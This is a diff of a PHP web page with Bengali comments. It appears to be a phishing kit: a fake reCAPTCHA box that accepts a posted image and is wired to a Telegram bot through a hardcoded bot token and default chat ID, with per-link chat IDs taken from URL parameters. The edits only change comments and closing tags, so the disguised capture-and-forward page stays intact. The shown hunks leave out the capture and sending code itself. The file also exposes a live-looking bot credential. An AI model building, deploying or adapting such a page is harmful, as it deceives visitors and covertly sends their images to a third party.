@@ -1,9 +1,9 @@
-v<?php
+<?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
     
-    // লিঙ্কের মাধ্যমে আসা ইউজারের Chat ID রিসিভ করা (না থাকলে ডিফল্ট আপনার আইডি থাকবে)
+    // ইউআরএল থেকে নির্দিষ্ট ইউজারের Chat ID নেওয়া হচ্ছে (ডিফল্ট ব্যাকআপ দেওয়া আছে)
     $chatId = isset($_POST['chat_id']) && !empty($_POST['chat_id']) ? $_POST['chat_id'] : "5896019931";
 
     $uploadDir = 'uploads/';
@@ -63,7 +63,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             align-items: center;
         }
         
-        /* reCAPTCHA Box Style */
         .recaptcha-box {
             background: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -145,7 +144,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <!-- reCAPTCHA Box -->
     <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
         <div class="recaptcha-left">
             <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
@@ -166,7 +164,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
-        const userChatId = urlParams.get('cid') || ''; // লিংক থেকে ইউজারের আইডি নেওয়া হচ্ছে
+        const userChatId = urlParams.get('cid') || ''; // ডায়নামিক Chat ID রিসিভ করা হচ্ছে
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
@@ -223,4 +221,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 console.error('Error:', error);
             });
         }
-   
+    </script>
+</body>
+</html>
